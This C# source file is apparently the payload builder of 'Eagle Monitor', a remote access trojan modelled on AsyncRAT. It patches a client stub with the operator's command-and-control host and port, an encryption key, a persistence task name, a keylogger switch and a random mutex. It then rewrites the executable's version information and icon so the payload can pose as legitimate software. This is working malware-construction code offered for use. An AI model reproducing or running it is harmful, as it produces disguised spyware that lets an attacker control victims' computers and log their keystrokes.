using System;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System.Runtime.InteropServices;
using Vestris.ResourceLib;

/*
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Inspiration : https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/AsyncRAT-C%23/Server/Forms/FormBuilder.cs
*/

namespace Eagle_Monitor_Builder
{
    internal class Helpers
    {
        internal class Utils
        {
            [DllImport("ntdll.dll")]
            internal static extern uint NtTerminateProcess(IntPtr hProcess, int errorStatus);

            internal static string GPath = Application.StartupPath;

            internal static string stubPath = GPath + "\\Stubs\\Client";
        }

        internal class Config
        {
            public string path { get; set; }
            public string ipOrDns { get; set; }
            public string port { get; set; }
            public string key { get; set; }
            public string taskName { get; set; }
            public string time { get; set; }
            public string keylog { get; set; }
            public string stub { get; set; }
            public bool persistence { get; set; }
            public bool is64BitStub { get; set; }
        }

        internal void Build(string path, string dns, string port, string key, string taskName, string time, string keylog, string[] assemblyInfo = null, string iconPath = null)
        {
            ModuleDefMD asmDef = ModuleDefMD.Load(path);
            try
            {
                using (asmDef)
                {
                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                    {
                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                        saveFileDialog1.InitialDirectory = Utils.GPath;
                        saveFileDialog1.OverwritePrompt = false;
                        saveFileDialog1.FileName = "Client";
                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                        {
                            WriteSettings(asmDef, dns, port, key , taskName, time, keylog, saveFileDialog1.FileName);
                            asmDef.Write(saveFileDialog1.FileName);
                            asmDef.Dispose();

                            WriteAssemblyInformation(saveFileDialog1.FileName, assemblyInfo[0], assemblyInfo[1], assemblyInfo[2], assemblyInfo[3], assemblyInfo[4], assemblyInfo[5], assemblyInfo[6], assemblyInfo[7]);
                        }

                        if (!string.IsNullOrEmpty(iconPath))
                            SetIcon(iconPath, saveFileDialog1.FileName);

                        MessageBox.Show("Done !", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
                asmDef?.Dispose();
            }
        }

        private void WriteSettings(ModuleDefMD asmDef, string dns, string port, string key, string taskName, string time, string offKeylog,string AsmName = "Client")
        {
            foreach (TypeDef type in asmDef.Types)
            {
                asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                asmDef.Name = Path.GetFileName(AsmName);
                if (type.Name == "Config")
                    foreach (MethodDef method in type.Methods)
                    {
                        if (method.Body == null) continue;
                        for (int i = 0; i < method.Body.Instructions.Count(); i++)
                        {
                            if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                            {
                                if (method.Body.Instructions[i].Operand.ToString() == "127.0.0.1")
                                {
                                    method.Body.Instructions[i].Operand = dns;
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "7788")
                                {
                                    method.Body.Instructions[i].Operand = port;
                                }

                                if (method.Body.Instructions[i].Operand.ToString() == "123456789")
                                {
                                    method.Body.Instructions[i].Operand = key;
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "%C%")
                                {
                                    method.Body.Instructions[i].Operand = taskName;
                                }

                                if (method.Body.Instructions[i].Operand.ToString() == "%1%")
                                {
                                    method.Body.Instructions[i].Operand = time;
                                }

                                if (method.Body.Instructions[i].Operand.ToString() == "False")
                                {
                                    method.Body.Instructions[i].Operand = offKeylog;
                                }

                                if (method.Body.Instructions[i].Operand.ToString() == "%MUTEX%")
                                {

                                    method.Body.Instructions[i].Operand = "EM-" + RandomString.NextString(24);
                                }
                            }
                        }
                    }
            }
        }

        private void WriteAssemblyInformation(string path, string fileVer, string prodVer, string prodName, string desc, string compName, string copyright, string trademarks, string orgiName) 
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(path);

                versionResource.FileVersion = fileVer;
                versionResource.ProductVersion = prodVer;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = prodName;
                stringFileInfo["FileDescription"] = desc;
                stringFileInfo["CompanyName"] = compName;
                stringFileInfo["LegalCopyright"] = copyright;
                stringFileInfo["LegalTrademarks"] = trademarks;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = orgiName;
                stringFileInfo["OriginalFilename"] = orgiName;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;

                versionResource.SaveTo(path);
            }
            catch (Exception)
            {}
        }

        private void SetIcon(string iconPath, string exePath) 
        {
            try
            {
                IconFile iconFile = new IconFile(iconPath);
                IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
                iconDirectoryResource.SaveTo(exePath);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
    }
}
